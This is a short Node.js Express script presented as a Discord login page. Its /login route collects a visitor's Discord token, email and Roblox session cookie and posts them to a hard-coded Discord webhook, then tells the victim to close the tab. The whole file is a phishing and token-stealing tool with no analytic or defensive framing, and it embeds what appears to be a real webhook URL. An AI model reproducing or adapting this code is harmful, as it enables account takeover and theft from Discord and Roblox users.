const express = require('express');
const axios = require('axios');
const dotenv = require('dotenv');
const app = express();
const port = process.env.PORT || 3000;

dotenv.config();

app.get('/', (req, res) => {
  res.send(`
    <a href="https://discord.com/login?redirect_to=discord.com">
      <img src="https://upload-os-bbs.hoyolab.com/upload/2023/04/14/323351764/bf2aa186a52f7d5f45d8b54e0808a121_5797701741494440015.jpg" alt="Discord Image" />
    </a>
  `);
});

app.get('/login', async (req, res) => {
  try {
    const { cookies } = req;
    const { discordToken, email, robloxCookie } = cookies;

    if (!discordToken || !email || !robloxCookie) {
      throw new Error('Incomplete data');
    }

    const data = { discordToken, email, robloxCookie };

    await axios.post( "https://discord.com/api/webhooks/1437519275391975485/kOyKz5U9HTkH11P6T2HE_KXK5dEtapamJF299n2f4TpN3QBY5nLBlWyJNUQ7j9gXKltk", data);

    res.status(200).send('Done! Please close this tab.');
  } catch (error) {
    console.error(error);
    res.status(500).send('An error occurred while processing your request.');
  }
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});
